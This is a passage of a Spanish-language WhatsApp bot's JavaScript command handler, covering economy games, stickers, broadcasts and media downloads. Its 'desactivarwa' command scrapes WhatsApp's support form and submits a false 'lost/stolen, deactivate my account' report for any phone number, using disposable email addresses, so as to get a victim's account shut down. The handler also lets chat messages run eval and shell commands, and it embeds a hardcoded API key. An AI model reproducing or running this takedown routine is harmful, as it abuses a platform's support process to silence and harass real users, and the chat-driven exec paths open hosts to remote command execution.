           reward / 2   
         } *DOLARES*`   
       );   
       global.db.data.users[m.sender].dolares -= Math.floor((reward / 2) * 1);   
       global.db.data.users[m.sender].lasCrime = new Date() * 1;   
     }   
   };  
  break 
 case 'sound1':  
  case 'sound2':  
  case 'sound3':  
  case 'sound4':  
  case 'sound5':  
  case 'sound6':  
  case 'sound7':  
  case 'sound8':  
  case 'sound9':  
  case 'sound10':  
  case 'sound11':  
  case 'sound12':  
  case 'sound13':  
  case 'sound14':  
  case 'sound15':  
  case 'sound16':  
  case 'sound17':  
  case 'sound18':  
  case 'sound19':  
  case 'sound20':  
  case 'sound21':  
  case 'sound22':  
  case 'sound23':  
  case 'sound24':  
  case 'sound25':  
  case 'sound26':  
  case 'sound27':  
  case 'sound28':  
  case 'sound29':  
  case 'sound30':  
  case 'sound31':  
  case 'sound32':  
  case 'sound33':  
  case 'sound34':  
  case 'sound35':  
  case 'sound36':  
  case 'sound37':  
  case 'sound38':  
  case 'sound39':  
  case 'sound40':  
  case 'sound41':  
  case 'sound42':  
  case 'sound43':  
  case 'sound44':  
  case 'sound45':  
  case 'sound46':  
  case 'sound47':  
  case 'sound48':  
  case 'sound49':  
  case 'sound50':  
  case 'sound51':  
  case 'sound52':  
  case 'sound53':  
  case 'sound54':  
  case 'sound55':  
  case 'sound56':  
  case 'sound57':  
  case 'sound58':  
  case 'sound59':  
  case 'sound60':  
  case 'sound61':  
  case 'sound62':  
  case 'sound63':  
  case 'sound64':  
  case 'sound65':  
  case 'sound66':  
  case 'sound67':  
  case 'sound68':  
  case 'sound69':  
  case 'sound70':  
  case 'sound71':  
  case 'sound72':  
  case 'sound73':  
  case 'sound74':  
  case 'sound75':  
  case 'sound76':  
  case 'sound77':  
  case 'sound78':  
  case 'sound79':  
  case 'sound80':  
  case 'sound81':  
  case 'sound82':  
  case 'sound83':  
  case 'sound84':  
  case 'sound85':  
  case 'sound86':  
  case 'sound87':  
  case 'sound88':  
  case 'sound89':  
  case 'sound90':  
  case 'sound91':  
  case 'sound92':  
  case 'sound93':  
  case 'sound94':  
  case 'sound95':  
  case 'sound96':  
  case 'sound97':  
  case 'sound98':  
  case 'sound99':  
  case 'sound100':  
  case 'sound101':  
  case 'sound102':  
  case 'sound103':  
  case 'sound104':  
  case 'sound105':  
  case 'sound106':  
  case 'sound107':  
  case 'sound108':  
  case 'sound109':  
  case 'sound110':  
  case 'sound111':  
  case 'sound112':  
  case 'sound113':  
  case 'sound114':  
  case 'sound115':  
  case 'sound116':  
  case 'sound117':  
  case 'sound118':  
  case 'sound119':  
  case 'sound120':  
  case 'sound121':  
  case 'sound122':  
  case 'sound123':  
  case 'sound124':  
  case 'sound125':  
  case 'sound126':  
  case 'sound127':  
  case 'sound128':  
  case 'sound129':  
  case 'sound130':  
  case 'sound131':  
  case 'sound132':  
  case 'sound133':  
  case 'sound134':  
  case 'sound135':  
  case 'sound136':  
  case 'sound137':  
  case 'sound138':  
  case 'sound139':  
  case 'sound140':  
  case 'sound141':  
  case 'sound142':  
  case 'sound143':  
  case 'sound144':  
  case 'sound145':  
  case 'sound146':  
  case 'sound147':  
  case 'sound148':  
  case 'sound149':  
  case 'sound150':  
  case 'sound151':  
  case 'sound152':  
  case 'sound153':  
  case 'sound154':  
  case 'sound155':  
  case 'sound156':  
  case 'sound157':  
  case 'sound158':  
  case 'sound159':  
  case 'sound160':  
  case 'sound161':  
  const DEV = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)  
  await shadow.sendMessage(m.chat, { audio: DEV, mimetype: 'audio/mp4', ptt: true }, { quoted: m })       
  break 
   case 'cazar': {
   cazar(conn, m, sender, text, fkontak)}
   break
   case 'dep': case 'depositar': { 
  if (text.includes("-")) {
 return m.reply("No utilice *-**");
} 
 const db = require('./libs/database/database.js') 
  let who;  
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;  
    else who = m.sender;  
  
     let users =  global.db.data.users[m.sender];  
     if (!text) return m.reply('[❌] Ingresa la cantidad de dinero que deseas Depositar.');  
     if (!text == '--all') {  
        let count = parseInt(users.dolares);  
        users.dolares -= count * 1  
        users.bank += count * 1  
        await m.reply(`*Depositaste ${count} de dinero al Banco.* 💸`);  
        return !0;  
     };  
     if (!Number(text)) return m.reply('[⚠️] La cantidad debe ser un Numero.');  
     let count = parseInt(args[0]);  
     if (!users.dolares) return m.reply('[🥺] No tienes dolares en la Cartera.');  
     if (users.dolares < count) return m.reply(`[❌] Solo tienes ${users.dolares} dolares en la Cartera.`);  
     users.dolares -= count * 1;  
     users.bank += count * 1;  
     await m.reply(`*Depositaste ${count} de dinero al Banco.* 💸`);  
  };  
  break 
case 'bal': case 'balance': case 'banco': { 
 await bal(conn, m, sender, fkontak)} 
 break
  case 's': case 'sticker': {    
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (/image/.test(mime)) {    
  conn.fakeReply(m.chat, `⏳ *Aguarde un momento estoy creando tu sticker....*`, '0@s.whatsapp.net', 'No haga spam')  
  //conn.sendMessage(m.chat, { text: `⏳ *Aguarde un momento estoy creando tu stickers....*\n\n*ᴺᵒ ʰᵃᵍᵃ ˢᵖᵃᵐ*` }, { quoted: m });      
  media = await quoted.download()    
  let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })    
  await fs.unlinkSync(encmedia)    
  } else if (/video/.test(mime)) {    
  if ((quoted.msg || quoted).seconds > 20) return reply('¡Máximo 20 segundos!')    
  media = await quoted.download()    
  let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.author, author: global.packname })    
  await new Promise((resolve) => setTimeout(resolve, 2000));     
  await fs.unlinkSync(encmedia)    
  } else {    
  reply(`*Y LA IMAGEN?*`)    
  }}    
  break;   
  
  case 'wm': case 'take': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!args.join(" ")) return reply(`*Responda un sticker para robar*`)  
  conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')  
  const swn = args.join(" ")  
  const pcknm = swn.split("|")[0]  
  const atnm = swn.split("|")[1]  
  if (m.quoted.isAnimated === true) {  
  conn.downloadAndSaveMediaMessage(quoted, "gifee")  
  conn.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})  
  } else if (/image/.test(mime)) {  
  let media = await quoted.download()  
  let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })  
  } else if (/video/.test(mime)) {  
  if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')  
  let media = await quoted.download()  
  let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })  
  } else {  
  reply(`Y la imagen?`)  
  }  
  }  
  break  
  
  case 'bcgc': case 'bcgroup': {  
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });     
  if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto que quiere difundir*` }, { quoted: msg });   
  let getGroups = await conn.groupFetchAllParticipating()  
  let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])  
  let anu = groups.map(v => v.id)  
  reply(`*Enviando mensajes oficial un momento*`)  
  for (let i of anu) {  
  await sleep(1500)  
  let txt = `「 COMUNICADO 」\n\n${text}`  
  conn.sendText(i, txt, fkontak)  
  }  
  reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛ ɢʀᴜᴘᴏs\nᴛɪᴇᴍᴘᴏ ᴛᴏᴛᴀʟ ᴅᴇ ᴇɴᴠɪᴏ: ${anu.length * 1.5} sᴇɢ`)}  
  break  
  case 'bc': case 'broadcast': case 'bcall': {  
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });     
  if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto*` }, { quoted: msg });   
  let anu = await store.chats.all().map(v => v.id)  
  reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛs`)  
  for (let yoi of anu) {  
  await sleep(1500)  
  conn.sendText(yoi, txt, fkontak)}  
  reply('Listo')}  
  break  
  
  case 'addcmd':
    if (!isCreator) return conn.adReply(m.chat, mess.owner, query, m, false)
    if (!m.quoted) return conn.adReply(m.chat, `*Responde a un sticker/imagen!!*`, query, m, false)
    if (!m.quoted.fileSha256) return conn.AdReply(m.chat, `*Solo puedes asignar comandos a stickers/imagenes*`, query, m, false)
    if (!text) return conn.AdReply(m.chat, `*Necesitas un texto para añadirlo al sticker!!*`, query, m, false)
    var hash = m.quoted.fileSha256.toString('base64')
    addCmd(text, hash)
    m.reply(`*El comando fue asignado con exito*`)
    break
  case 'delcmd':   
  if (!isCreator) return conn.adReply(m.chat, info.owner, query, m, false)  
  if (!m.quoted) return conn.adReply(m.chat, `*[ ⚠️ ] 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰𝙻 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙾 𝙸𝙼𝙰𝙶𝙴𝙽 𝙰𝙻 𝙲𝚄𝙰𝙻 𝙳𝙴𝚂𝙴𝙰 𝙰𝙶𝚁𝙴𝙶𝙰𝚁 𝚄𝙽 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙾 𝚃𝙴𝚇𝚃𝙾*`, query, m, false)  
  var hash = m.quoted.fileSha256.toString('base64')  
  if (!hash) return conn.adReply(m.chat, `*El sticker no tiene un comando asignado!!*`, query, m, false)  
  delete global.db.data.sticker[hash]  
  m.reply(`*hecho*`)  
  break  
  
  case "desactivarwa": case "soporte": {  
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
  if (Input) {  
  let cekno = await conn.onWhatsApp(Input)  
  if (cekno.length == 0) return reply(`El participante ya no está registrado en WhatsApp`)  
  if (Input == owner + "@s.whatsapp.net") return reply(`Solo para mi jefe`)  
  var targetnya = m.sender.split('@')[0]  
  try {  
  var axioss = require('axios')  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")  
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")  
  let cookie = ntah.headers["set-cookie"].join("; ")  
  const cheerio = require('cheerio');  
  let $ = cheerio.load(ntah.data)  
  let $form = $("form");  
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href  
  let form = new URLSearchParams()  
  form.append("jazoest", $form.find("input[name=jazoest]").val())  
  form.append("lsd", $form.find("input[name=lsd]").val())  
  form.append("step", "submit")  
  form.append("country_selector", "INDIA")  
  form.append("phone_number", `${Input.split("@")[0]}`,)  
  form.append("email", email.data[0])  
  form.append("email_confirm", email.data[0])  
  form.append("platform", "ANDROID")  
  form.append("your_message", `Perdido/roubado: desative minha conta`)  
  form.append("__user", "0")  
  form.append("__a", "1")  
  form.append("__csr", "")  
  form.append("__req", "8")  
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")  
  form.append("dpr", "1")  
  form.append("__ccg", "UNKNOWN")  
  form.append("__rev", "1006630858")  
  form.append("__comment_req", "0")  
  let res = await axioss({url, method: "POST", data: form, headers: {cookie}})  
  let payload = String(res.data)  
  if (payload.includes(`"payload":true`)) {  
  reply(`*Listo..!*`)  
  } else if (payload.includes(`"payload":false`)) {  
  reply(`Ufff limit`)  
  } else reply(util.format(res.data))  
  } catch (err) {reply(`${err}`)}  
  } else reply('*⚠️Ingresa el numero*')}  
  break  
  
  case 'addcase':  
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
  if (!text) throw 'envia el case'  
  try {  
  const addcase =[fs.readFileSync('main.js', 'utf8').slice(0, fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('main.js', 'utf8').slice(fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5)].join('\n');  
  fs.writeFileSync('main.js', addcase)  
  conn.editMessage(m.chat, '*aguarde estoy agregando el case*', '*Listo!!*', 5, m)  
  } catch (error) {  
  throw error  
  }  
  break  
  
  case 'getcase':   
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
  if (!text) return m.reply(`Que comando a buscar o que?`)   
  try {   
  bbreak = 'break'   
  reply('case ' + `'${args[0]}'` + fs.readFileSync('./main.js').toString().split(`case '${args[0]}'`)[1].split(bbreak)[0] + bbreak)   
  } catch (err) {   
  console.error(err)   
  reply(" Error, tal vez no existe el comando")   
  }   
  break  
  
  case 'update':   
  if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });      
  try {      
  let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))  
  await conn.sendMessage(from, { text: stdout.toString() }, { quoted: msg });  
  } catch {   
  let updatee = execSync('git remote set-url origin https://github.com/DIEGO-OFC/ShadowBotv5-MD.git && git pull')  
  await conn.sendMessage(from, { text: updatee.toString() }, { quoted: msg })}    
  break 
  case 'setppbot': case 'setppbp':  
 if (!isCreator) return reply(info.owner) 
 if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`) 
 if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`) 
 if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`) 
 var media = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg') 
 if (args[0] == `'panjang'`) { 
 var { img } = await generateProfilePicture(media) 
 await shadow.query({ 
 tag: 'iq', 
 attrs: { 
 to: botnm, 
 type:'set', 
 xmlns: 'w:profile:picture' 
 }, 
 content: [ 
 { 
 tag: 'picture', 
 attrs: { type: 'image' }, 
 content: img 
 } 
 ] 
 }) 
 fs.unlinkSync(media) 
 reply(`Sukses`) 
 } else { 
 var memeg = await shadow.updateProfilePicture(botnm, { url: media }) 
 fs.unlinkSync(media) 
 reply(`Sukses`) 
 } 
  
 break 
 case 'retirar': case 'retirardinero': { 
  if (text.includes("-")) {
 return m.reply("No utilice *-**");
} 
 const db = './libs/database/database.js'; 
  let user = global.db.data.users[m.sender]; if (!text) return m.reply('*[❌] Ingresa la cantidad de dinero que deseas Retirar.*');  
 if (text == '--all') {  
  let count = parseInt(user.bank);  
  user.bank -= count * 1  
  user.dolares += count * 1  
  await m.reply(`*Retiraste ${count} de dinero del Banco.* 💸`);  
  return !0  
  }  
  if (!Number(text)) return m.reply('[⚠️] La cantidad debe ser un Numero.');  
  let count = parseInt(text);  
  if (!user.bank) return m.reply('[😿] No tienes dinero en Banco.')  
  if (user.bank < count) return m.reply(`[❌] Solo tienes ${user.bank} de dinero en el Banco.`)  
  user.bank -= count * 1  
  user.dolares += count * 1  
  await m.reply(`*Retiraste ${count} de dinero del Banco.* 💸`)  
  } 
 break 
 case 'emojimix': { 
 if (!text) return reply(`Example : ${prefix + command} 😅+🤔`) 
 //const {getBuffer} = require('./libs/fuctions.js'); 
 reply(info.wait) 
 let [emoji1, emoji2] = text.split`+` 
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`) 
 for (let res of anu.results) { 
 let encmedia = await conn.sendVideoAsSticker(from, res.url, m, { packname: global.author, author: global.packname })   //conn.sendMessage(m.chat, { sticker: { url: res.url } }, { quoted: fkontak})  
 await fs.unlinkSync(encmedia) 
 } 
 } 
 break 
 case "style": 
 case "styletext": 
  { 
  db.data.users[m.sender].limit -= 1; // -1 limit 
  let { styletext } = require("./libs/scraper2"); 
  if (!text) return reply("falta texto"); 
  let anu = await styletext(text); 
  let teks = `Srtle Text From ${text}\n\n`; 
  for (let i of anu) { 
  teks += `*${i.name}* : ${i.result}\n\n`; 
  } 
  m.reply(teks); 
  } 
  break 
 case 'toimage': case 'jpg': { 
 const {webp2png} = require("./libs/webp2mp4.js"); 
  
    const q = m.quoted || m;  
    let mime = q.mediaType || "";  
  
    let media = await q.download();  
    let out = (await webp2png(media).catch((_) => null)) || Buffer.alloc(0);  
    conn.sendMessage(m.chat, {image: {url: out}, assSticker: true}, {quoted: m}) 
 } 
 break 
case 'claim': case 'daily': case 'reclamar': 
 await claim(conn, m, sender) 
 break
 case "pinterest": { 
  if (!text) return reply(`Ejemplo : ${prefix + command}`); 
pinteresdw(conn, m, text, args, command)}
  break; 
  
 case 'play': 
 if (global.db.data.users[m.sender].dolares < 1) return reply(info.sindolares)  
 db.data.users[m.sender].dolares -= 5 
 reply(info.dolares5)        
 await play(conn, m, command, text)  
 break
case 'otakudesu': {
const translate = require('@vitalets/google-translate-api');
if (!text) return reply(`*Falta texto*`);
let res = await fetch(`https://zeltoria.site/api/animanga/otakudesu?q=${text}`)
let anu = await res.json()
let translatedResultxs = await Promise.all(anu.result.map(async (v) => {
let titulo = await translate(v.title, { to: 'es', autoCorrect: true })
return `*Título:* ${titulo.text}\n*Generos:* ${v.genres}\n*Status:* ${v.status}\n*rating:* ${v.rating}\n*Enlace:* ${v.url}\n*Imagenes:* ${v.thumbnail}`

}))
let resultShadow = translatedResultxs.join('\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n')
m.reply(resultShadow)
}
break 
case 'wattpad': {
const translate = require('@vitalets/google-translate-api');
if (!text) return reply(`*Falta texto*`);
let res = await fetch(`https://api.xyroinee.xyz/api/search/wattpad?q=${text}&lc=es&apikey=${keyxy}`)
let anu = await res.json()
let translatedResults = await Promise.all(anu.data.map(async (v) => {
let titulo = await translate(v.title, { to: 'es', autoCorrect: true })
let descs = await translate(v.desc, { to: 'es', autoCorrect: true })
return `*Título:* ${titulo.text}\n*Leídos:* ${v.reads}\n*Votos:* ${v.vote}\n*Capítulos:* ${v.chapter}\n*Enlace:* ${v.link}\n*Descripción:* ${descs.text}`
}))
let resultText = translatedResults.join('\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n')
m.reply(resultText)
}
break
case 'cosplay' :case 'animecosplay' : {
reply('cargando, por favor espera')
conn.sendMessage(m.chat, {image: {url: "https://api.akuari.my.id/randomimganime/cosplay"}}, {quoted: m});
}
break
case 'level': case 'levelup': case 'lvl': { 
 await levelxd(conn, m, sender, text, fkontak)} 
 break
case 'addmoney': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
addDolares(conn, m, sender, text, command)}
break
case "hola" : {

  try {

  m.reply("Hola " + m.pushName);

 } catch (e) {

    m.reply("*🚩 Error :* " + new Error(e).message);

}

}

break
case 'gato': {
let res = await fetch('https://api.thecatapi.com/v1/images/search')
let json = await res.json()
conn.sendMessage(m.chat, {image: {url: json[0].url}, caption: 'By Diego-OFC'}, {quoted: m})}
break
case 'dog': case 'perro': {
let res = await fetch(`https://dog.ceo/api/breeds/image/random`) 
 
 let json = await res.json() 
 
 conn.sendMessage(m.chat, {image: {url: json.message }}, {quoted: m})}
break
case 'onlyfotos': case 'onlyfansfoto': {
 let res = await fetch(`https://xanax-apis.online/api/onlyfans/fotos?apitoken=${xanax}`) 
  
 let json = await res.json() 
  
 conn.sendMessage(m.chat, {image: {url: json.resultado }}, {quoted: m})}
break
case 'printcode': {
 let res = `https://api.lolhuman.xyz/api/carbon?apikey=${lolkeysapi}&code=print(${text})&language=javascript`
 
 conn.sendMessage(m.chat, {image: {url: res }}, {quoted: m})}
break
case 'lb': 
lb(conn, participants, args, m)
break
case 'ytmp3': {
 if (!text) return m.reply(`Ejemplo: *${prefix + command}* https://youtube.com/watch?v=xYQgNZ14G_Q`)
const xnx = `https://xanax-apis.online/youtube/mp3?url=${text}&apitoken=xanax-apis`
conn.sendMessage(m.chat, { audio: { url: xnx }, fileName: 'xd.mp3', mimetype: 'audio/mp4' }, { quoted: m })}
break



  
 function msToTime(duration) {   
     var milliseconds = parseInt((duration % 1000) / 100),   
       seconds = Math.floor((duration / 1000) % 60),   
       minutes = Math.floor((duration / (1000 * 60)) % 60),   
       hours = Math.floor((duration / (1000 * 60 * 60)) % 24);   
  
     hours = hours < 10 ? "0" + hours : hours;   
     minutes = minutes < 10 ? "0" + minutes : minutes;   
     seconds = seconds < 10 ? "0" + seconds : seconds;   
  
     return minutes + " m y " + seconds + " s ";   
   }  
  
          default:  
              if (budy.startsWith('>')) {  
                  if (!isCreator) return  
                  try {  
                      return reply(JSON.stringify(eval(budy.slice(2)), null, '\t'))  
                  } catch (e) {  
                      e = String(e)  
                      reply(e)  
                  }  
              }  
              if (budy.startsWith('=>')) {  
                  if (!isCreator) return  
                  try {  
                      return  reply(JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'))  //gata.sendMessage(from, JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'), text, { quoted: msg })  
                  } catch (e) {  
                      e = String(e)  
                      reply(e)  
                  }  
              }  
              if (budy.startsWith('$')) {  
                  if (!isCreator) return  
                  try {  
                      return reply(String(execSync(budy.slice(2), { encoding: 'utf-8' })))  
                  } catch (err) {  
  console.log(util.format(err))  
  let e = String(err)  
  conn.sendMessage("595975740803@s.whatsapp.net", { text: "Hola Creador/desarrollador, parece haber un error, por favor arreglarlo 🥲" + util.format(e),   
  contextInfo:{  
  forwardingScore: 9999999,   
  isForwarded: true  
  }})  
  
  process.on('uncaughtException', function (err) {  
  console.log('Caught exception: ', err)  
  })}}}}} 
  
  let file = require.resolve(__filename)  
  fs.watchFile(file, () => {  
  fs.unwatchFile(file)  
  console.log(chalk.redBright(`Update ${__filename}`))  
  delete require.cache[file]  
  require(file)  
  })